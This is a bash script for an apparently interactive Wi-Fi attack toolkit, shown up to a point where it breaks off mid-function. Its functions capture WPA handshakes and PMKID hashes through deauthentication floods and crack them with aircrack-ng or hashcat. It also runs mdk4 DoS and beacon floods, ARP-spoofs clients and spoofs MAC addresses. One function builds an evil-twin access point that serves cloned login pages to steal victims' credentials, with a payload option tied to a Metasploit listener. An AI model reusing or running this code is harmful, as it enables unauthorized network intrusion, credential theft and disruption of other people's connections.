#!/bin/bash

#Creation of variables for colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""

handshakedel() {
	tput cnorm; echo -ne "\n${redColour}[?]$grayColour Do you want to delete the captured handshake? [Y/N]: " && read handel
	if [ "$handel" == "y" ] || [ "$handel" == "Y" ]; then
		sudo rm -rf Handshake*
	elif [ "$handel" == "n" ] || [ "$handel" == "N" ]; then
		mkdir -p HandShake
		mv Handshake* HandShake/
		echo -e "\n${greenColour}[+]$grayColour Packets were saved in “HandShake”\n"
		sleep 0.3
		exit
	elif [ "$handel" == " " ] || [ "$handel" == "" ]; then	
		echo -e "\n\n${redColour}[!]${endColour}${grayColour} Please select an option...${endColour}\n" 
		sleep 2
		handshakedel
	else
		echo -e "\n\n${redColour}[!]${endColour}${grayColour} Please select an option...${endColour}\n" 
		sleep 2
		handshakedel
	fi
}

filestrash() {
	files=(dnsmasq.conf hostapd.conf Capture.pcapng hash.hc22000 iface datos-privados.txt TsharkCap) 
	tput civis; cd $pathmain
	
	for file in "${files[@]}"; do
		sudo rm -rf $file 2>/dev/null
	done

	test -f $pathmain/Handshake-01.cap
	if [ "$(echo $?)" -eq 0 ]; then 
		handshakedel
	fi

	tput cnorm
}

trap ctrl_c INT

ctrl_c() {
	echo -e "\n\n${redColour}[!]${endColour}${grayColour} Exit...${endColour}\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	filestrash
	exit
}
 
test -f /etc/debian_version
debian=$(echo $?)
	
test -f /etc/arch-release
arch=$(echo $?)

test -f /etc/redhat-release
fedora=$(echo $?)
#On the basis of the distribution, download the dependencies 
programs() {
	
	dependencias=(aircrack-ng xterm hashcat nmap hcxtools hcxdumptool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin dsniff arp-scan wash)
	
	if [ "$debian" -eq 0 ]; then 
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.3
			echo -e "${greenColour}[+]$grayColour macchanger"
			sleep 0.1
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo apt-get install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			
			test -f /usr/bin/$program

			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "${greenColour}[+]$grayColour $program"
				sleep 0.1
			else
				test -f /usr/sbin/$program
				sbin=$(echo $?)
				test -f /usr/share/hashcat-utils/$program
				hashu=$(echo $?)
				if [ "$sbin" -eq 0 ]; then
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				elif [ "$hashu" -eq 0 ]; then 
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				else
					echo -e "${blueColour}[*]$grayColour Installing ${program}..." 
					sudo apt-get install $program -y > /dev/null 2>&1
				fi
			fi

		done
	elif [ "$arch" -eq 0 ]; then
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ "$mactest" -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.3
			echo -e "${greenColour}[+]$grayColour macchanger"
			sleep 0.1
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo pacman -S macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${depasendencias[@]}"; do
			
			test -f /usr/bin/$program
			
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "${greenColour}[+]$grayColour $program"
				sleep 0.1
			else
				test -f /usr/sbin/$program
				sbin=$(echo $?)
				test -f /usr/share/hashcat-utils/$program
				hashu=$(echo $?)
				if [ "$sbin" -eq 0 ]; then
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				elif [ "$hashu" -eq 0 ]; then 
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				else
					echo -e "${blueColour}[*]$grayColour Installing ${program}..." 
					sudo pacman -S $program -y > /dev/null 2>&1
				fi
			fi	
		done
	elif [ "$fedora" -eq 0 ]; then
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.3
			echo -e "${greenColour}[+]$grayColour macchanger"
			sleep 0.1
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo dnf install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			
			test -f /usr/bin/$program
			
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "${greenColour}[+]$grayColour $program"
				sleep 0.1
			else
				test -f /usr/sbin/$program
				sbin=$(echo $?)
				test -f /usr/share/hashcat-utils/$program
				hashu=$(echo $?)
				if [ "$sbin" -eq 0 ]; then
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				elif [ "$hashu" -eq 0 ]; then 
					echo -e "${greenColour}[+]$grayColour $program"
					sleep 0.1
				else
					echo -e "${blueColour}[*]$grayColour Installing ${program}..." 
					sudo dnf install $program -y > /dev/null 2>&1
				fi
			fi
		done
	else 
		echo -e "\n${redColour}[!]$grayColour Can't find your distribution, download these programs manually: aircrack-ng xterm hashcat git nmap hcxdumptool hcxpcapngtool php dnsmasq hostapd mdk4 gunzip tshark cap2hccapx.bin" 
		sleep 5
	fi
}
#Update your OS repositories
updatepackages() {
	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Do you want to update the packages? [Y/N]: " && read update 
	if [ "$update" == "y" ] || [ "$update" == "Y" ]; then
		if [ "$debian" -eq 0 ]; then
			clear; tput civis
			echo -e "\n${greenColour}[*]$grayColour Updating the packages..."
			sudo apt-get update -y > /dev/null 2>&1
			programs
		elif [ "$arch" -eq 0 ]; then
			clear; tput civis
			echo -e "${greenColour}[*]$grayColour Updating the packages..."
			sudo pacman -Syu -y > /dev/null 2>&1
			programs
		elif [ "$fedora" -eq 0 ]; then
			clear; tput civis
			echo -e "${greenColour}[*]$grayColour Updating the packages..."
			sudo dnf update -y > /dev/null 2>&1
			programs
		fi
	elif [ "$update" == " " ] || [ "$update" == "" ]; then 
		echo -e "${redColour}[!]$grayColour Select an option"
		updatepackages
	elif [ "$update" == "n" ] || [ "$update" == "N" ]; then
		programs
	else
		echo -e "${redColour}[!]$grayColour Select an option"; sleep 2
		updatepackages
	fi

}
# Monitor mode check
modeverification() {
	iwconfig | grep Monitor > /dev/null 2>&1
	if [ "$(echo $?)" -ne 0 ]; then
		echo -e "\n$redColour[!]$grayColour Monitor mode is not activated"
		sleep 2; tput cnorm; echo -ne "$greenColour[?]$grayColour You want to reactivate the monitor mode? [Y/N]: " && read again
		if [ "$again" == "y" ] || [ "$again" == "Y" ]; then
			monitormode
		elif [ "$again" == "n" ] || [ "$again" == "N" ]; then
			ctrl_c
		else
			modeverification
		fi
	fi
}
#Function to start monitor mode and kill confluent processes 
monitormode() {
	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig 
	tput cnorm
	echo -ne "\n${redColour}[?]$grayColour Network card: " && read tar
	$cleancolor; tput civis
	airmon-ng start $tar > /dev/null 2>&1
	clear; echo -e "\n${blueColour}[*]$grayColour Interface:\n" && iwconfig 
	tput cnorm; echo -ne "${redColour}\n[?]$grayColour Card confirmation (Enter the name exactly as it appears): " && read tar
	tput civis
	airmon-ng check kill > /dev/null 2>&1
	ifconfig $tar down > /dev/null 2>&1 && macchanger -a $tar > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	modeverification
}

#Test if the package was captured and if you have rockyou in your OS
testhandshake() {
	test -f Handshake-01.cap
	if [ "$(echo $?)" == "0" ]; then
		tput cnorm
		echo -ne "\n$yellowColour[?]$grayColour Do you want to brute force your GPU? [Y/N]: " && read gpuno
		if [ "$gpuno" == "Y" ] || [ "$gpuno" == "y" ]; then
			gpuhand
		else
			test -f /usr/share/wordlists/rockyou.txt
			if [ "$(echo $?)" == "0" ]; then
				echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
				echo -ne "$blueColour[?]$grayColour Dictionary path to use: " && read dicc
				$cleancolor; tput civis
				xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
				echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
			else
				test -f /usr/share/wordlists/rockyou.txt.gz
				if [ "$(echo $?)" -eq 0 ]; then
					cd /usr/share/wordlists
					sudo gunzip -d rockyou.txt.gz
					cd $pathmain
					echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
					echo -ne "$blueColour[?]$grayColour Dictionary path to use: " && read dicc
					$cleancolor; tput civis
					test -f $dicc
					diccveri=$(echo $?)
					if [ "$diccveri" -ne 0 ]; then
						echo -ne "\n${redColour}[!]$grayColour The path you typed does not exist, try again to continue"
						sleep 3; cd $path
						testhandshake
					else 
						xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
						echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
					fi
				else 
					echo -e "\n$redColour[!]$grayColour You don't have rockyou.txt in your system or it is in another directory"; sleep 2; testhandshake
				fi
			fi
		fi
	else 
		echo -e "${redColour}\n[!]$grayColour Handshake has not been captured"
		sleep 2
	fi
}

#[1] Attack with aircrack
handshake_ataque() {
	clear; tput civis
	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
	sleep 1
	xterm -hold -e "airodump-ng ${tar}" &
	xtermnet=$!
	tput cnorm
	echo -ne "\n${greenColour}[?]$grayColour Select a network (Essid): " && read ap
	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
	tput civis
	$cleancolor; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
	echo -e "${greenColour}[!]$grayColour If you choose no, a global deauthentication will be performed on the network"
	tput cnorm; echo -ne "${greenColour}[?]$grayColour Do you want to add a MAC address for deauthentication?  [Y/N]: " && read macoption
	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
		airodump_filter_xtermMAC_PID=$!
		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
		aireplay_xtermMAC_PID=$!
		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
		tput civis; echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
		$cleancolor
		sleep 10; kill -9 $airodump_filter_xtermMAC_PID
		wait $airodump_filter_xtermMAC_PID 2>/dev/null
		testhandshake
	elif [ "$macoption" == "n" ] || [ "$macoption" == "N" ]; then
		echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
		$cleancolor
		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
		airodump_filter_xterm_PID=$!

		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
		$cleancolor
									
		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null
		testhandshake
	fi
}

#It will exit the program and restart the network card and the services required for connections
exitresart() {
	echo -e "\n${redColour}[*]$grayColour Exiting and restarting the network card...\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	filestrash
	exit
}

#[2] Attack with hcxtools and hashcat
pkmid_ataque() {
	clear; tput civis
	echo -e "\n${greenColour}[*]$grayColour Starting PMKID attack...\n"
	sleep 1; tput cnorm
	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
	$cleancolor
	xterm -hold -e "hcxdumptool -i $tar -w ${pathmain}/Capture.pcapng -F --rds=1" &
	hcxdumptool_PID=$!
	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
    echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
	hcxpcapngtool -o hash.hc22000 Capture.pcapng > /dev/null 2>&1
	sudo rm Capture.pcapng
	sleep 1
	$cleancolor
	test -f hash.hc22000
	if [ "$(echo $?)" -eq 0 ]; then
		clear; echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
		sleep 1
		tput cnorm
		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
		tput civis
		hashcat -a 0 -m 22000 hash.hc22000 $dicc1
		echo -ne "${redColour}[!]$grayColour Enter to exit" && read
	else 
		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
		sleep 3
	fi
}
#[7] force brute with aircrack for files or hashes .cap
fuerza_.cap() {
	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
	sleep 1
	echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
	$cleancolor
	tput cnorm
	echo -ne "${blueColour}[?]$grayColour File path .cap: " && read cap
	echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
	aircrack-ng -w $dicc $cap
	echo -ne "${redColour}[!]$grayColour Enter to exit" && read
}
#force brute with dictionary precomputed
fuerza_rainbow() {
	echo -ne "${greenColour}[?]$grayColour File path .cap : " && read cap
	echo -ne "${greenColour}[?]$grayColour File path dictionary precomputed: " && read pathdictio
	xterm -hold -e "aircrack-ng -r $pathdictio $cap" 
}
#[8] Attack with airolib for the creation of precomputed dictionaries
rainbowtaibles() {
	tput civis
	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Tables..."; sleep 2
	tput cnorm
	echo -ne "\n${blueColour}[?]$grayColour Dictionary path: " && read ruta
	sudo airolib-ng dicc-hashed --import passwd $ruta > /dev/null 2>&1
	test -f dicc-hashed
	if [ "$(echo $?)" -eq 0 ]; then
		echo -ne "${turquoiseColour}[?]$grayColour Essid or Network name: " && read ap 
		echo "$ap" > essid.lst
		sudo airolib-ng dicc-hashed --import essid essid.lst > /dev/null 2>&1
		sudo airolib-ng dicc-hashed --clean all 
		echo -ne "${redColour}[?]$grayColour How many seconds do you want the hasheo process to last?: " && read seg
		xterm -hold -e "airolib-ng dicc-hashed --batch" & 
		batch_PID=$!
		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
		echo -e "\n${greenColour}[+]$grayColour Dictionary finish (name: dicc-hashed)"
		echo -ne "${blueColour}[?]$grayColour Do you want to do a brute force attack with the dictionary? [Y/N]: " && read attak
		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
			fuerza_rainbow
		else
			echo -e "\n${redColour}[!]$grayColour Exit"
		fi
	else
		echo -e "\n${redColour}[!]$grayColour The dictionary could not be created or you have entered the wrong dictionary path"
		sleep 2
	fi
}
#Menu for force brute 
menuforce() {
	clear; echo -e "${yellowColour}\n1) Force Brute .cap"
	echo -e "2) Create hashed dictionary (Rainbow taibles)"
	echo -e "3) Force brute with dictionary hashed"
	echo -e "4) Exit"
	echo -ne "\n${yellowColour}[?]$grayColour Attack Force: " && read force 
	case $force in 
	1)
	fuerza_.cap
	;;
	2)
	rainbowtaibles
	;;
	3)
	fuerza_rainbow
	;;
	4)
	echo -e "\n${redColour}[*]$grayColour Exit..."
	;;
	*)
	echo -e "${redColour}\n[!]$grayColour Invalid option"
	sleep 2
	;;
	esac
}

reconnect() {
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sleep 15
}

modeagain () {
	airmon-ng start $tar > /dev/null 2>&1
	ifconfig $tar down && macchanger -a $tar 2>/dev/null
	ifconfig $tar up 2>/dev/null
	airmon-ng check kill > /dev/null 2>&1
	tput cnorm
}

dosforclient () {
	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client... Wait a moment\n\n\n"
	reconnect; clear
	sleep 1; sudo arp-scan -I $(echo "$tar" | sed 's/mon$//') --localnet 2>/dev/null
	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
	echo -ne "\n${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
	tput civis
	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\+\)$/1/g')
	xterm -hold -e "sudo arpspoof -i "$(echo "$tar" | sed 's/mon$//')" -t "$clientattackdos" "$ipnew"" &
	arpspoof_PID=$!
	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
	modeagain
}

#[5] local network scanner with ip with nmap
scanner() {
	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting Scanner..."
	reconnect
	tput cnorm; echo -ne "$blueColour[?]$grayColour Local Network IP (192.168.1.0): " && read iplocal
	tput civis; echo -e "\n---------------------------------------------------\n"
	sudo nmap -sP -Pn ${iplocal}/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
	echo -e "\n---------------------------------------------------"
	echo -ne "${redColour}[!]$grayColour Enter to exit" && read 
	modeagain
}
#[6] Creation of a fake network with a login to steal the credentials of the connecting victims (test on version android 10)
ntwkphishing() {
	
	credentials() {
		hosts=0 
		tput civis
		while true; do
			echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
			find \-name datos-privados.txt | xargs cat 2>/dev/null
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
			sleep 3; clear
		done
	}

	attack() {
		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
		sleep 3
		echo -e "interface=${tar}\n" > hostapd.conf
		echo -e "driver=nl80211\n" >> hostapd.conf
		echo -e "ssid=$netclo\n" >> hostapd.conf
		echo -e "hw_mode=g\n" >> hostapd.conf
		echo -e "channel=$cloch\n" >> hostapd.conf
		echo -e "macaddr_acl=0\n" >> hostapd.conf
		echo -e "auth_algs=1\n" >> hostapd.conf
		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
		echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
		sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
		hostapd hostapd.conf > /dev/null 2>&1 &
		sleep 5
		echo -e "${yellowColour}[*]${grayColour} Configuring dnsmasq..."
		echo -e "interface=${tar}\n" > dnsmasq.conf
		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
		echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
		echo -e "server=8.8.8.8\n" >> dnsmasq.conf
		echo -e "log-queries\n" >> dnsmasq.conf
		echo -e "log-dhcp\n" >> dnsmasq.conf
		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
		sleep 1
		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
		sleep 1
		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
		sleep 3
		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
		cd src
		if [ "$(echo $?)" -ne 0 ]; then
			cd $pathmain
			cd src
		fi
		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
		tput cnorm
		echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
		check_logins=0; for login in "${logins[@]}"; do
			if [ "$login" == "$usedlogin" ]; then
					check_logins=1
			fi
		
			done
			
			if [ "$usedlogin" == "cliqq-payload" ]; then
				check_logins=2
			fi
			
			if [ $check_logins -eq 1 ]; then
				tput civis; pushd $usedlogin > /dev/null 2>&1
				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
				php -S 192.168.1.1:80 > /dev/null 2>&1 &
				sleep 2
				popd > /dev/null 2>&1; credentials
			elif [ $check_logins -eq 2 ]; then
				tput civis; pushd $usedlogin > /dev/null 2>&1
				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
				php -S 192.168.1.1:80 > /dev/null 2>&1 &
				sleep 2
				echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
				cat msfconsole.rc
				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
				echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
				popd > /dev/null 2>&1; credentials
			else
				tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
				echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
				pushd $usedlogin > /dev/null 2>&1
				php -S 192.168.1.1:80 > /dev/null 2>&1 
				popd > /dev/null 2>&1; credentials
			fi

	  	cd $pathmain
	}
	deau(){
		xterm -hold -e "airodump-ng ${tar}" &
		xtermnetclo=$!
		tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour What network do you want to clone?: " && read netclo
		tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour What channel is $netclo?: " && read cloch
		tput civis
		$cleancolor; kill -9 $xtermnetclo; wait $xtermnetclo 2>/dev/null
		xterm -hold -e "airodump-ng -c $cloch --essid $netclo $tar" &
		xtermAirclo=$!
		sleep 2; xterm -hold -e "aireplay-ng -0 10000 -e $netclo -c FF:FF:FF:FF:FF:FF $tar" &
		aireplay_xterm_PIDclo=$!
		sleep 10; kill -9 $aireplay_xterm_PIDclo; wait $aireplay_xterm_PIDclo 2>/dev/null
		kill -9 $xtermAirclo; wait $xtermAirclo 2>/dev/null
		attack
	}

	clear
	tput civis; echo -e "\n$purpleColour[*]$grayColour Starting Wifiphisher/Evil Twin..."
	sleep 2
	deau
}
#[3] Denial of service attack with mdk
dosattack() {
	tput civis; clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
	xterm -e "airodump-ng ${tar}" &
	dosairdump_PID=$!
	tput cnorm; echo -ne "\n$greenColour[?]$grayColour Select a network (MAC): " && read redos
	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
	tput civis
	sudo mdk4 $tar a -a $redos
	echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
}
#[4] Beacon flood attack with mdk
beaconflood() {
	tput civis; clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
	sudo mdk4 $tar b -s 1000
	echo -ne "\n\n\n\n\n${greenColour}[+]$grayColour Enter to continue" && read

}
#[5] Network traffic with tcpdump
traffic() {
	clear; tput civis; echo -e "\n$blueColour[*]$grayColour Starting Network traffic"; sleep 1
	tput cnorm; echo -ne "[?] Do you want to save the captured packets? [Y/N]: " && read captraffic
	tput civis
	if [ "$captraffic" == "y" ] || [ "$captraffic" == "Y" ]; then 
		xterm -hold -e "sudo tshark -i $tar -w TsharkCap" &
		echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
	elif [ "$captraffic" == "N" ] || [ "$captraffic" == "n" ]; then
		xterm -hold -e "sudo tshark -i $tar" &
		echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
	else
		xterm -hold -e "sudo tshark -i $tar" &
		echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
	fi
}
#banner for attack menu
bannerattack() {
	tput civis; clear
	echo -e "	   ${blueColour}.--------."
	echo -e "${redColour}     :  ${blueColour}.-@#*==-!==+#@*-."
	echo -e "${redColour}     I__________${blueColour}%@%%#*-.${redColour}___"
	echo -e "${redColour}O====I__________${blueColour}#%%#*-.${redColour}_____>"
	echo -e "${redColour}     I    ${blueColour}.-*=:::::--."
	echo -e "${redColour}     :      ${blueColour}.-####-."
	echo -e "	      ${blueColour}.*_"
	echo -e "               ${blueColour}."
	$cleancolor
	echo -e "${greenColour}\n[+]${grayColour} Network card: $tar"
	echo -e "${greenColour}[+]${grayColour} Anon MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
}
fakeap() {

	credentials() {
		hosts=0 
		tput civis
		while true; do
			echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
			find \-name datos-privados.txt | xargs cat 2>/dev/null
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
			sleep 3; clear
		done
	}
	
	clear; tput civis; echo -e "$blueColour[*]$grayColour Starting Fake/Rogue AP"; sleep 2
	tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
	echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
	tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	sleep 3
	echo -e "interface=${tar}\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
	echo -e "ssid=$ssid\n" >> hostapd.conf
	echo -e "hw_mode=g\n" >> hostapd.conf
	echo -e "channel=$ch\n" >> hostapd.conf
	echo -e "macaddr_acl=0\n" >> hostapd.conf
	echo -e "auth_algs=1\n" >> hostapd.conf
	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
	echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
	sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
	hostapd hostapd.conf > /dev/null 2>&1 &
	sleep 5
	echo -e "${yellowColour}[*]${grayColour} Configuring dnsmasq..."
	echo -e "interface=${tar}\n" > dnsmasq.conf
	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
	echo -e "log-queries\n" >> dnsmasq.conf
	echo -e "log-dhcp\n" >> dnsmasq.conf
	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
	sleep 1
	ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
	sleep 1
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	sleep 3
	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
	cd src
	if [ "$(echo $?)" -ne 0 ]; then
		cd $pathmain
		cd src
	fi
	logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
	tput cnorm
	echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
	check_logins=0; for login in "${logins[@]}"; do
		if [ "$login" == "$usedlogin" ]; then
				check_logins=1
		fi
		
		done
			
		if [ "$usedlogin" == "cliqq-payload" ]; then
			check_logins=2
		fi
			
		if [ $check_logins -eq 1 ]; then
			tput civis; pushd $usedlogin > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			popd > /dev/null 2>&1; credentials
		elif [ $check_logins -eq 2 ]; then
			tput civis; pushd $usedlogin > /dev/null 2>&1
			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
			php -S 192.168.1.1:80 > /dev/null 2>&1 &
			sleep 2
			echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
